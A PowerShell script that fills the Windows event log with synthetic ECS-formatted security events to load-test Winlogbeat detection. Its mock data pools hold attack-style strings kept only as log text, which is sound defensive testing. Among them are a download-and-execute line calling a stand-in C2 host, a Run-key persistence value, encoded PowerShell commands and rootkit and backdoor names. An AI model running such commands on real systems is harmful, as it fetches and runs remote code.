# ============================
# CONFIG
# ============================
$LogName  = "Application"
$Source   = "WinlogbeatLoadTest"

# Volume controls
$TotalEvents = 1000   # total events to generate
$BatchSize   = 100    # events per loop iteration
$SleepMs     = 50     # pause between batches (set 0 for max speed)

# ============================
# INIT EVENT SOURCE
# ============================
function Test-IsAdmin {
    $currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = [Security.Principal.WindowsPrincipal]::new($currentIdentity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Test-EventSourceExistsSafe {
    param([string]$SourceName)
    try {
        return [System.Diagnostics.EventLog]::SourceExists($SourceName)
    }
    catch {
        # Non-admin sessions can fail this check when Security log is inaccessible.
        return $false
    }
}

if (-not (Test-EventSourceExistsSafe -SourceName $Source)) {
    if (Test-IsAdmin) {
        Write-Host "Creating event source '$Source'..."
        New-EventLog -LogName $LogName -Source $Source
    }
    else {
        $fallbackSources = @("Windows PowerShell", "PowerShell", "Application Error")
        $resolvedSource  = $null

        foreach ($candidate in $fallbackSources) {
            if (Test-EventSourceExistsSafe -SourceName $candidate) {
                $resolvedSource = $candidate
                break
            }
        }

        if ($null -eq $resolvedSource) {
            throw "No usable event source found for non-admin execution. Run PowerShell as Administrator once to create source '$Source'."
        }

        Write-Host "Using existing event source '$resolvedSource' (non-admin mode)."
        $Source = $resolvedSource
    }
}

# ============================
# MOCK DATA POOLS
# ============================
$Users = @(
    "alice","bob","charlie","david","eve",
    "svc_account","admin","guest","developer","analyst"
)

$Domains = @("CORP","WORKGROUP","CONTOSO","INTERNAL","AD")

$Processes = @(
    @{ name="powershell.exe"; path="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" },
    @{ name="cmd.exe";        path="C:\Windows\System32\cmd.exe" },
    @{ name="notepad.exe";    path="C:\Windows\System32\notepad.exe" },
    @{ name="svchost.exe";    path="C:\Windows\System32\svchost.exe" },
    @{ name="explorer.exe";   path="C:\Windows\explorer.exe" },
    @{ name="wscript.exe";    path="C:\Windows\System32\wscript.exe" },
    @{ name="mshta.exe";      path="C:\Windows\System32\mshta.exe" },
    @{ name="regsvr32.exe";   path="C:\Windows\System32\regsvr32.exe" },
    @{ name="rundll32.exe";   path="C:\Windows\System32\rundll32.exe" },
    @{ name="msiexec.exe";    path="C:\Windows\System32\msiexec.exe" }
)

$IPs = @(
    "192.168.1.10","192.168.1.20","10.0.0.5","10.1.2.3",
    "172.16.0.2","172.20.5.10","8.8.8.8","1.1.1.1",
    "203.0.113.5","198.51.100.22"
)

$Ports = @(80, 443, 8080, 8443, 3389, 22, 445, 135, 139, 53, 3306, 1433, 5432, 6379)

$FilePaths = @(
    "C:\Users\Public\Documents\report.docx",
    "C:\Temp\install.exe",
    "C:\Windows\Temp\tmp_payload.ps1",
    "C:\ProgramData\config.dat",
    "C:\Users\$env:USERNAME\Desktop\malware.bat",
    "C:\Windows\System32\drivers\etc\hosts",
    "C:\Program Files\App\update.exe",
    "C:\Temp\encoded_blob.b64"
)

$RegistryPaths = @(
    "HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM\System\CurrentControlSet\Services\SuspiciousSvc",
    "HKCU\Software\Classes\CLSID\{DeadBeef}",
    "HKLM\Software\Policies\Microsoft\Windows\PowerShell",
    "HKLM\System\CurrentControlSet\Control\Lsa"
)

$DnsNames = @(
    "update.microsoft.com","telemetry.corp.local","malware.c2.example.com",
    "github.com","pastebin.com","raw.githubusercontent.com",
    "suspicious-domain.xyz","dns.google","internal.corp.local"
)

$ServiceNames = @("SuspiciousSvc","RemoteHelper","WinDefend","WinUpdate","BackdoorSvc","SvcFake")
$ServiceTypes  = @("kernel driver","file system driver","adapter","Win32 own process","Win32 share process")

$LogonTypes = @(
    @{ type=2;  name="Interactive" },
    @{ type=3;  name="Network" },
    @{ type=4;  name="Batch" },
    @{ type=5;  name="Service" },
    @{ type=7;  name="Unlock" },
    @{ type=8;  name="NetworkCleartext" },
    @{ type=10; name="RemoteInteractive" },
    @{ type=11; name="CachedInteractive" }
)

$WmiQueries = @(
    "SELECT * FROM Win32_Process",
    "SELECT * FROM Win32_Service WHERE State='Running'",
    "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'"
)

$PSScriptBlocks = @(
    "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://c2.example.com/shell.ps1')",
    "Get-Process | Where-Object { `$_.CPU -gt 50 }",
    "[System.Convert]::FromBase64String('dGVzdA==') | Set-Content C:\Temp\out.bin",
    "Add-Type -AssemblyName PresentationFramework",
    "Set-ItemProperty -Path 'HKLM:\Software\...' -Name 'Run' -Value 'malware.exe'"
)

$Drivers = @(
    "C:\Windows\System32\drivers\tcpip.sys",
    "C:\Windows\System32\drivers\NDIS.sys",
    "C:\Temp\suspicious_driver.sys",
    "C:\Windows\System32\ntoskrnl.exe",
    "C:\ProgramData\drv\rootkit.sys"
)

# ============================
# FAST EVENT WRITER
# ============================
function Write-EventFast {
    param (
        [string]$Message,
        [int]$EventId = 1000,
        [System.Diagnostics.EventLogEntryType]$EntryType = [System.Diagnostics.EventLogEntryType]::Information
    )
    [System.Diagnostics.EventLog]::WriteEntry($Source, $Message, $EntryType, $EventId)
}

# ============================
# ECS EVENT GENERATORS
# ============================

# Security 4624/4625 - Logon success/failure | 4634 - Logoff
function New-AuthEvent {
    $user    = Get-Random $Users
    $domain  = Get-Random $Domains
    $logon   = Get-Random $LogonTypes
    $success = (Get-Random -Minimum 0 -Maximum 10) -gt 1   # ~80% success
    $isLogoff = (Get-Random -Minimum 0 -Maximum 5) -eq 0

    if ($isLogoff) {
        $eventId = 4634; $action = "logged-out";  $type = "end";   $outcome = "success"
    } elseif ($success) {
        $eventId = 4624; $action = "logged-in";   $type = "start"; $outcome = "success"
    } else {
        $eventId = 4625; $action = "logged-in";   $type = "start"; $outcome = "failure"
    }

    $event = [ordered]@{
        "@timestamp"           = (Get-Date).ToString("o")
        "event.kind"           = "event"
        "event.category"       = @("authentication")
        "event.type"           = @($type)
        "event.action"         = $action
        "event.outcome"        = $outcome
        "event.module"         = "security"
        "event.provider"       = "Microsoft-Windows-Security-Auditing"
        "winlog.event_id"      = $eventId
        "winlog.channel"       = "Security"
        "winlog.computer_name" = $env:COMPUTERNAME
        "winlog.logon.type"    = $logon.name
        "winlog.logon.id"      = "0x$(([System.Convert]::ToString((Get-Random -Minimum 100000 -Maximum 999999), 16)))"
        "user.name"            = $user
        "user.domain"          = $domain
        "user.id"              = "S-1-5-21-$(Get-Random -Min 1000000000 -Max 9999999999)-$(Get-Random -Min 1000 -Max 9999)"
        "source.ip"            = Get-Random $IPs
        "source.port"          = Get-Random $Ports
        "host.name"            = $env:COMPUTERNAME
        "host.os.type"         = "windows"
        "log.level"            = if ($outcome -eq "failure") { "warning" } else { "information" }
    }

    $entryType = if ($outcome -eq "failure") { [System.Diagnostics.EventLogEntryType]::Warning } else { [System.Diagnostics.EventLogEntryType]::Information }
    Write-EventFast -Message ($event | ConvertTo-Json -Compress) -EventId $eventId -EntryType $entryType
}

# Security 4688/4689 - Process creation/termination
function New-ProcessEvent {
    $user   = Get-Random $Users
    $domain = Get-Random $Domains
    $proc   = Get-Random $Processes
    $parent = Get-Random $Processes
    $isEnd  = (Get-Random -Minimum 0 -Maximum 5) -eq 0
    $eventId = if ($isEnd) { 4689 } else { 4688 }
    $type    = if ($isEnd) { "end" } else { "start" }

    $event = [ordered]@{
        "@timestamp"                = (Get-Date).ToString("o")
        "event.kind"                = "event"
        "event.category"            = @("process")
        "event.type"                = @($type)
        "event.action"              = "Process $type"
        "event.module"              = "security"
        "event.provider"            = "Microsoft-Windows-Security-Auditing"
        "winlog.event_id"           = $eventId
        "winlog.channel"            = "Security"
        "winlog.computer_name"      = $env:COMPUTERNAME
        "process.name"              = $proc.name
        "process.executable"        = $proc.path
        "process.pid"               = Get-Random -Minimum 1000 -Maximum 50000
        "process.args"              = @($proc.path, "-NoProfile", "-Command", "whoami")
        "process.parent.name"       = $parent.name
        "process.parent.executable" = $parent.path
        "process.parent.pid"        = Get-Random -Minimum 1000 -Maximum 50000
        "user.name"                 = $user
        "user.domain"               = $domain
        "host.name"                 = $env:COMPUTERNAME
        "host.os.type"              = "windows"
        "log.level"                 = "information"
    }
    Write-EventFast -Message ($event | ConvertTo-Json -Compress) -EventId $eventId
}

# Sysmon 3 - Network connection
function New-NetworkEvent {
    $proc    = Get-Random $Processes
    $user    = Get-Random $Users
    $dstPort = Get-Random $Ports
    $proto   = Get-Random @("tcp", "udp")
    $initiated = (Get-Random -Minimum 0 -Maximum 2) -eq 0

    $proto_app = switch ($dstPort) {
        443  { "https" }
        80   { "http"  }
        53   { "dns"   }
        3389 { "rdp"   }
        445  { "smb"   }
        default { "unknown" }
    }

    $event = [ordered]@{
        "@timestamp"           = (Get-Date).ToString("o")
        "event.kind"           = "event"
        "event.category"       = @("network")
        "event.type"           = @("connection", "start")
        "event.action"         = "Network connection detected"
        "event.module"         = "sysmon"
        "event.provider"       = "Microsoft-Windows-Sysmon"
        "winlog.event_id"      = 3
        "winlog.channel"       = "Microsoft-Windows-Sysmon/Operational"
        "winlog.computer_name" = $env:COMPUTERNAME
        "process.name"         = $proc.name
        "process.executable"   = $proc.path
        "process.pid"          = Get-Random -Minimum 1000 -Maximum 50000
        "source.ip"            = Get-Random $IPs
        "source.port"          = Get-Random -Minimum 1024 -Maximum 65535
        "destination.ip"       = Get-Random $IPs
        "destination.port"     = $dstPort
        "network.transport"    = $proto
        "network.protocol"     = $proto_app
        "network.direction"    = if ($initiated) { "egress" } else { "ingress" }
        "user.name"            = $user
        "host.name"            = $env:COMPUTERNAME
        "host.os.type"         = "windows"
        "log.level"            = "information"
    }
    Write-EventFast -Message ($event | ConvertTo-Json -Compress) -EventId 3
}

# Sysmon 11/2/23 - File creation / modification / deletion
function New-FileEvent {
    $proc  = Get-Random $Processes
    $user  = Get-Random $Users
    $path  = Get-Random $FilePaths
    $types = @(
        @{ type="creation"; id=11 },
        @{ type="change";   id=2  },
        @{ type="deletion"; id=23 }
    )
    $chosen = Get-Random $types
    $ext    = [System.IO.Path]::GetExtension($path).TrimStart(".")

    $event = [ordered]@{
        "@timestamp"           = (Get-Date).ToString("o")
        "event.kind"           = "event"
        "event.category"       = @("file")
        "event.type"           = @($chosen.type)
        "event.action"         = "File $($chosen.type)"
        "event.module"         = "sysmon"
        "event.provider"       = "Microsoft-Windows-Sysmon"
        "winlog.event_id"      = $chosen.id
        "winlog.channel"       = "Microsoft-Windows-Sysmon/Operational"
        "winlog.computer_name" = $env:COMPUTERNAME
        "file.path"            = $path
        "file.name"            = [System.IO.Path]::GetFileName($path)
        "file.extension"       = $ext
        "file.directory"       = [System.IO.Path]::GetDirectoryName($path)
        "process.name"         = $proc.name
        "process.executable"   = $proc.path
        "process.pid"          = Get-Random -Minimum 1000 -Maximum 50000
        "user.name"            = $user
        "host.name"            = $env:COMPUTERNAME
        "host.os.type"         = "windows"
        "log.level"            = "information"
    }
    Write-EventFast -Message ($event | ConvertTo-Json -Compress) -EventId $chosen.id
}

# Sysmon 12/13/14 - Registry object/value create/change/delete
function New-RegistryEvent {
    $proc    = Get-Random $Processes
    $regPath = Get-Random $RegistryPaths
    $valName = Get-Random @("Run","Shell","Load","Update","AutoRun")
    $valData = Get-Random @("C:\Temp\svc.exe","powershell.exe -enc dABlAHMAdAA=","cmd.exe /c whoami","C:\Windows\System32\calc.exe")
    $types   = @(
        @{ type="creation"; id=12 },
        @{ type="change";   id=13 },
        @{ type="deletion"; id=14 }
    )
    $chosen = Get-Random $types

    $event = [ordered]@{
        "@timestamp"           = (Get-Date).ToString("o")
        "event.kind"           = "event"
        "event.category"       = @("registry")
        "event.type"           = @($chosen.type)
        "event.action"         = "Registry value $($chosen.type)"
        "event.module"         = "sysmon"
        "event.provider"       = "Microsoft-Windows-Sysmon"
        "winlog.event_id"      = $chosen.id
        "winlog.channel"       = "Microsoft-Windows-Sysmon/Operational"
        "winlog.computer_name" = $env:COMPUTERNAME
        "registry.path"        = "$regPath\$valName"
        "registry.key"         = $regPath
        "registry.value.name"  = $valName
        "registry.value.data"  = $valData
        "registry.value.type"  = "REG_SZ"
        "process.name"         = $proc.name
        "process.executable"   = $proc.path
        "process.pid"          = Get-Random -Minimum 1000 -Maximum 50000
        "host.name"            = $env:COMPUTERNAME
        "host.os.type"         = "windows"
        "log.level"            = "information"
    }
    Write-EventFast -Message ($event | ConvertTo-Json -Compress) -EventId $chosen.id
}

# Sysmon 22 - DNS query
function New-DnsEvent {
    $proc   = Get-Random $Processes
    $domain = Get-Random $DnsNames
    $qtype  = Get-Random @("A","AAAA","MX","TXT","CNAME","NS")

    $event = [ordered]@{
        "@timestamp"           = (Get-Date).ToString("o")
        "event.kind"           = "event"
        "event.category"       = @("network")
        "event.type"           = @("protocol")
        "event.action"         = "DNS query"
        "event.module"         = "sysmon"
        "event.provider"       = "Microsoft-Windows-Sysmon"
        "winlog.event_id"      = 22
        "winlog.channel"       = "Microsoft-Windows-Sysmon/Operational"
        "winlog.computer_name" = $env:COMPUTERNAME
        "dns.question.name"    = $domain
        "dns.question.type"    = $qtype
        "dns.answers"          = @(@{ data = Get-Random $IPs; type = "A" })
        "process.name"         = $proc.name
        "process.executable"   = $proc.path
        "process.pid"          = Get-Random -Minimum 1000 -Maximum 50000
        "host.name"            = $env:COMPUTERNAME
        "host.os.type"         = "windows"
        "log.level"            = "information"
    }
    Write-EventFast -Message ($event | ConvertTo-Json -Compress) -EventId 22
}

# Security 4720/4722/4724/4725/4726/4732/4733 - IAM (user/group management)
function New-IamEvent {
    $actor  = Get-Random $Users
    $target = Get-Random $Users
    $domain = Get-Random $Domains
    $actions = @(
        @{ id=4720; action="added-user-account";    type=@("user","creation") },
        @{ id=4722; action="enabled-user-account";  type=@("user","change") },
        @{ id=4724; action="reset-password";        type=@("user","change") },
        @{ id=4725; action="disabled-user-account"; type=@("user","change") },
        @{ id=4726; action="deleted-user-account";  type=@("user","deletion") },
        @{ id=4732; action="added-group-member";    type=@("group","change") },
        @{ id=4733; action="removed-group-member";  type=@("group","change") }
    )
    $act = Get-Random $actions

    $event = [ordered]@{
        "@timestamp"           = (Get-Date).ToString("o")
        "event.kind"           = "event"
        "event.category"       = @("iam")
        "event.type"           = $act.type
        "event.action"         = $act.action
        "event.module"         = "security"
        "event.provider"       = "Microsoft-Windows-Security-Auditing"
        "winlog.event_id"      = $act.id
        "winlog.channel"       = "Security"
        "winlog.computer_name" = $env:COMPUTERNAME
        "user.name"            = $actor
        "user.domain"          = $domain
        "user.target.name"     = $target
        "user.target.domain"   = $domain
        "host.name"            = $env:COMPUTERNAME
        "host.os.type"         = "windows"
        "log.level"            = "information"
    }
    Write-EventFast -Message ($event | ConvertTo-Json -Compress) -EventId $act.id
}

# System 7045/7036 - Service installed / state change
function New-ServiceEvent {
    $svcName   = Get-Random $ServiceNames
    $svcType   = Get-Random $ServiceTypes
    $isInstall = (Get-Random -Minimum 0 -Maximum 3) -eq 0
    $state     = Get-Random @("running","stopped","paused")
    $eventId   = if ($isInstall) { 7045 } else { 7036 }

    $event = [ordered]@{
        "@timestamp"           = (Get-Date).ToString("o")
        "event.kind"           = "event"
        "event.category"       = @("process","configuration")
        "event.type"           = @("change")
        "event.action"         = if ($isInstall) { "service-installed" } else { "service-state-change" }
        "event.module"         = "system"
        "event.provider"       = "Service Control Manager"
        "winlog.event_id"      = $eventId
        "winlog.channel"       = "System"
        "winlog.computer_name" = $env:COMPUTERNAME
        "service.name"         = $svcName
        "service.type"         = $svcType
        "service.state"        = if ($isInstall) { "installed" } else { $state }
        "host.name"            = $env:COMPUTERNAME
        "host.os.type"         = "windows"
        "log.level"            = "information"
    }
    Write-EventFast -Message ($event | ConvertTo-Json -Compress) -EventId $eventId
}

# PowerShell 4104 - ScriptBlock logging
function New-PowerShellEvent {
    $script = Get-Random $PSScriptBlocks
    $user   = Get-Random $Users

    $event = [ordered]@{
        "@timestamp"                        = (Get-Date).ToString("o")
        "event.kind"                        = "event"
        "event.category"                    = @("process")
        "event.type"                        = @("info")
        "event.action"                      = "ScriptBlockLogging"
        "event.module"                      = "powershell"
        "event.provider"                    = "Microsoft-Windows-PowerShell"
        "winlog.event_id"                   = 4104
        "winlog.channel"                    = "Microsoft-Windows-PowerShell/Operational"
        "winlog.computer_name"              = $env:COMPUTERNAME
        "powershell.file.script_block_text" = $script
        "powershell.sequence"               = Get-Random -Minimum 1 -Maximum 100
        "powershell.total"                  = Get-Random -Minimum 1 -Maximum 5
        "user.name"                         = $user
        "host.name"                         = $env:COMPUTERNAME
        "host.os.type"                      = "windows"
        "log.level"                         = "warning"
    }
    Write-EventFast -Message ($event | ConvertTo-Json -Compress) -EventId 4104 -EntryType ([System.Diagnostics.EventLogEntryType]::Warning)
}

# Security 4698/4702 - Scheduled task created/updated
function New-ScheduledTaskEvent {
    $user      = Get-Random $Users
    $domain    = Get-Random $Domains
    $taskName  = Get-Random @("WinUpdate","SvcMon","Persistence","BackupTask","TelemetryRun","EvilTask")
    $isCreate  = (Get-Random -Minimum 0 -Maximum 2) -eq 0
    $eventId   = if ($isCreate) { 4698 } else { 4702 }

    $event = [ordered]@{
        "@timestamp"               = (Get-Date).ToString("o")
        "event.kind"               = "event"
        "event.category"           = @("iam","configuration")
        "event.type"               = @(if ($isCreate) { "creation" } else { "change" })
        "event.action"             = if ($isCreate) { "scheduled-task-created" } else { "scheduled-task-updated" }
        "event.module"             = "security"
        "event.provider"           = "Microsoft-Windows-Security-Auditing"
        "winlog.event_id"          = $eventId
        "winlog.channel"           = "Security"
        "winlog.computer_name"     = $env:COMPUTERNAME
        "user.name"                = $user
        "user.domain"              = $domain
        "winlog.task_name"         = "\Microsoft\Windows\$taskName"
        "winlog.task_content"      = "<Task><Actions><Exec><Command>cmd.exe</Command></Exec></Actions></Task>"
        "host.name"                = $env:COMPUTERNAME
        "host.os.type"             = "windows"
        "log.level"                = "information"
    }
    Write-EventFast -Message ($event | ConvertTo-Json -Compress) -EventId $eventId
}

# Sysmon 6 - Driver / image load
function New-ImageLoadEvent {
    $proc   = Get-Random $Processes
    $driver = Get-Random $Drivers
    $hash   = [System.BitConverter]::ToString(
                  [System.Security.Cryptography.MD5]::Create().ComputeHash(
                      [System.Text.Encoding]::UTF8.GetBytes($driver)
                  )
              ).Replace("-","").ToLower()

    $event = [ordered]@{
        "@timestamp"           = (Get-Date).ToString("o")
        "event.kind"           = "event"
        "event.category"       = @("driver")
        "event.type"           = @("start")
        "event.action"         = "Driver loaded"
        "event.module"         = "sysmon"
        "event.provider"       = "Microsoft-Windows-Sysmon"
        "winlog.event_id"      = 6
        "winlog.channel"       = "Microsoft-Windows-Sysmon/Operational"
        "winlog.computer_name" = $env:COMPUTERNAME
        "file.path"            = $driver
        "file.name"            = [System.IO.Path]::GetFileName($driver)
        "file.pe.imphash"      = $hash
        "process.name"         = $proc.name
        "process.executable"   = $proc.path
        "process.pid"          = Get-Random -Minimum 1000 -Maximum 50000
        "host.name"            = $env:COMPUTERNAME
        "host.os.type"         = "windows"
        "log.level"            = "information"
    }
    Write-EventFast -Message ($event | ConvertTo-Json -Compress) -EventId 6
}

# Sysmon 19/20/21 - WMI event filter/consumer/binding
function New-WmiEvent {
    $user  = Get-Random $Users
    $query = Get-Random $WmiQueries
    $types = @(
        @{ id=19; action="WmiEventFilter-activity" },
        @{ id=20; action="WmiEventConsumer-activity" },
        @{ id=21; action="WmiEventConsumerToFilter-activity" }
    )
    $chosen = Get-Random $types

    $event = [ordered]@{
        "@timestamp"                      = (Get-Date).ToString("o")
        "event.kind"                      = "event"
        "event.category"                  = @("process")
        "event.type"                      = @("change")
        "event.action"                    = $chosen.action
        "event.module"                    = "sysmon"
        "event.provider"                  = "Microsoft-Windows-Sysmon"
        "winlog.event_id"                 = $chosen.id
        "winlog.channel"                  = "Microsoft-Windows-Sysmon/Operational"
        "winlog.computer_name"            = $env:COMPUTERNAME
        "winlog.event_data.Query"         = $query
        "winlog.event_data.Operation"     = "Created"
        "user.name"                       = $user
        "host.name"                       = $env:COMPUTERNAME
        "host.os.type"                    = "windows"
        "log.level"                       = "information"
    }
    Write-EventFast -Message ($event | ConvertTo-Json -Compress) -EventId $chosen.id
}

# Security 4648 - Explicit credential use (Pass-the-Hash / RunAs scenario)
function New-ExplicitCredentialEvent {
    $user   = Get-Random $Users
    $target = Get-Random $Users
    $domain = Get-Random $Domains
    $ip     = Get-Random $IPs

    $event = [ordered]@{
        "@timestamp"           = (Get-Date).ToString("o")
        "event.kind"           = "event"
        "event.category"       = @("authentication")
        "event.type"           = @("start")
        "event.action"         = "logged-in"
        "event.outcome"        = "success"
        "event.module"         = "security"
        "event.provider"       = "Microsoft-Windows-Security-Auditing"
        "winlog.event_id"      = 4648
        "winlog.channel"       = "Security"
        "winlog.computer_name" = $env:COMPUTERNAME
        "user.name"            = $user
        "user.domain"          = $domain
        "user.target.name"     = $target
        "user.target.domain"   = $domain
        "source.ip"            = $ip
        "process.name"         = "lsass.exe"
        "process.executable"   = "C:\Windows\System32\lsass.exe"
        "host.name"            = $env:COMPUTERNAME
        "host.os.type"         = "windows"
        "log.level"            = "information"
    }
    Write-EventFast -Message ($event | ConvertTo-Json -Compress) -EventId 4648
}

# Sysmon 1 / Security 4688 variant - Process with network pipe (lateral movement indicator)
function New-LateralMovementEvent {
    $user   = Get-Random $Users
    $domain = Get-Random $Domains
    $proc   = Get-Random $Processes
    $ip     = Get-Random $IPs

    $event = [ordered]@{
        "@timestamp"           = (Get-Date).ToString("o")
        "event.kind"           = "alert"
        "event.category"       = @("intrusion_detection","process","network")
        "event.type"           = @("start")
        "event.action"         = "lateral-movement-detected"
        "event.outcome"        = "unknown"
        "event.module"         = "sysmon"
        "event.provider"       = "Microsoft-Windows-Sysmon"
        "winlog.event_id"      = 1
        "winlog.channel"       = "Microsoft-Windows-Sysmon/Operational"
        "winlog.computer_name" = $env:COMPUTERNAME
        "process.name"         = $proc.name
        "process.executable"   = $proc.path
        "process.pid"          = Get-Random -Minimum 1000 -Maximum 50000
        "process.command_line" = "$($proc.path) -e JABjAD0ATgBlAHcA"
        "user.name"            = $user
        "user.domain"          = $domain
        "destination.ip"       = $ip
        "destination.port"     = Get-Random @(445, 3389, 5985, 5986)
        "host.name"            = $env:COMPUTERNAME
        "host.os.type"         = "windows"
        "log.level"            = "warning"
    }
    Write-EventFast -Message ($event | ConvertTo-Json -Compress) -EventId 1 -EntryType ([System.Diagnostics.EventLogEntryType]::Warning)
}

# Security 4776 - NTLM authentication attempt
function New-NtlmAuthEvent {
    $user    = Get-Random $Users
    $success = (Get-Random -Minimum 0 -Maximum 5) -ne 0

    $event = [ordered]@{
        "@timestamp"           = (Get-Date).ToString("o")
        "event.kind"           = "event"
        "event.category"       = @("authentication")
        "event.type"           = @("start")
        "event.action"         = "logged-in"
        "event.outcome"        = if ($success) { "success" } else { "failure" }
        "event.module"         = "security"
        "event.provider"       = "Microsoft-Windows-Security-Auditing"
        "winlog.event_id"      = 4776
        "winlog.channel"       = "Security"
        "winlog.computer_name" = $env:COMPUTERNAME
        "winlog.logon.type"    = "Network"
        "user.name"            = $user
        "source.ip"            = Get-Random $IPs
        "host.name"            = $env:COMPUTERNAME
        "host.os.type"         = "windows"
        "log.level"            = if ($success) { "information" } else { "warning" }
    }
    $entryType = if ($success) { [System.Diagnostics.EventLogEntryType]::Information } else { [System.Diagnostics.EventLogEntryType]::Warning }
    Write-EventFast -Message ($event | ConvertTo-Json -Compress) -EventId 4776 -EntryType $entryType
}

# Security 4663 - Object access (file/folder auditing)
function New-ObjectAccessEvent {
    $user   = Get-Random $Users
    $domain = Get-Random $Domains
    $path   = Get-Random $FilePaths
    $access = Get-Random @("ReadData","WriteData","AppendData","Delete","ReadAttributes","WriteAttributes")

    $event = [ordered]@{
        "@timestamp"                  = (Get-Date).ToString("o")
        "event.kind"                  = "event"
        "event.category"              = @("file")
        "event.type"                  = @("access")
        "event.action"                = "File access"
        "event.outcome"               = "success"
        "event.module"                = "security"
        "event.provider"              = "Microsoft-Windows-Security-Auditing"
        "winlog.event_id"             = 4663
        "winlog.channel"              = "Security"
        "winlog.computer_name"        = $env:COMPUTERNAME
        "winlog.event_data.ObjectName"= $path
        "winlog.event_data.AccessList"= $access
        "user.name"                   = $user
        "user.domain"                 = $domain
        "file.path"                   = $path
        "file.name"                   = [System.IO.Path]::GetFileName($path)
        "host.name"                   = $env:COMPUTERNAME
        "host.os.type"                = "windows"
        "log.level"                   = "information"
    }
    Write-EventFast -Message ($event | ConvertTo-Json -Compress) -EventId 4663
}

# Security 4697 - Service installed in the system (alternate path)
function New-ServiceInstallSecurityEvent {
    $user    = Get-Random $Users
    $domain  = Get-Random $Domains
    $svcName = Get-Random $ServiceNames
    $svcType = Get-Random $ServiceTypes

    $event = [ordered]@{
        "@timestamp"                    = (Get-Date).ToString("o")
        "event.kind"                    = "event"
        "event.category"                = @("process","configuration")
        "event.type"                    = @("change")
        "event.action"                  = "service-installed"
        "event.module"                  = "security"
        "event.provider"                = "Microsoft-Windows-Security-Auditing"
        "winlog.event_id"               = 4697
        "winlog.channel"                = "Security"
        "winlog.computer_name"          = $env:COMPUTERNAME
        "user.name"                     = $user
        "user.domain"                   = $domain
        "service.name"                  = $svcName
        "service.type"                  = $svcType
        "service.state"                 = "installed"
        "host.name"                     = $env:COMPUTERNAME
        "host.os.type"                  = "windows"
        "log.level"                     = "information"
    }
    Write-EventFast -Message ($event | ConvertTo-Json -Compress) -EventId 4697
}

# ============================
# GENERATOR DISPATCH TABLE
# Weighted so high-frequency Windows events appear more often.
# ============================
$Generators = @(
    { New-AuthEvent },               # 4624/4625/4634  - logon/logoff
    { New-AuthEvent },               # (2x weight)
    { New-ProcessEvent },            # 4688/4689        - process create/terminate
    { New-ProcessEvent },            # (2x weight)
    { New-NetworkEvent },            # Sysmon 3         - network connection
    { New-FileEvent },               # Sysmon 11/2/23   - file create/modify/delete
    { New-RegistryEvent },           # Sysmon 12/13/14  - registry change
    { New-DnsEvent },                # Sysmon 22        - DNS query
    { New-IamEvent },                # 4720-4733        - user/group management
    { New-ServiceEvent },            # 7045/7036        - service install/state
    { New-PowerShellEvent },         # 4104             - ScriptBlock logging
    { New-ScheduledTaskEvent },      # 4698/4702        - scheduled task
    { New-ImageLoadEvent },          # Sysmon 6         - driver load
    { New-WmiEvent },                # Sysmon 19/20/21  - WMI activity
    { New-ExplicitCredentialEvent }, # 4648             - explicit credentials
    { New-LateralMovementEvent },    # Sysmon 1         - lateral movement
    { New-NtlmAuthEvent },           # 4776             - NTLM auth
    { New-ObjectAccessEvent },       # 4663             - object/file access
    { New-ServiceInstallSecurityEvent } # 4697          - service install (Security log)
)

# ============================
# GENERATION LOOP
# ============================
Write-Host "Starting ECS event generation across all Winlogbeat detection points..."
Write-Host "  Generators : $($Generators.Count) event types"
Write-Host "  Total      : $TotalEvents events  |  Batch: $BatchSize  |  Delay: ${SleepMs}ms"

$start     = Get-Date
$generated = 0

for ($i = 0; $i -lt $TotalEvents; $i += $BatchSize) {
    $batchCount = [Math]::Min($BatchSize, $TotalEvents - $i)

    for ($j = 0; $j -lt $batchCount; $j++) {
        $gen = Get-Random $Generators
        & $gen
        $generated++
    }

    if ($SleepMs -gt 0) {
        Start-Sleep -Milliseconds $SleepMs
    }

    if (($i + $batchCount) % 500 -eq 0 -or ($i + $batchCount) -eq $TotalEvents) {
        Write-Host "  Generated $generated / $TotalEvents events..."
    }
}

$elapsed = (Get-Date) - $start
Write-Host "Completed $generated events in $elapsed"
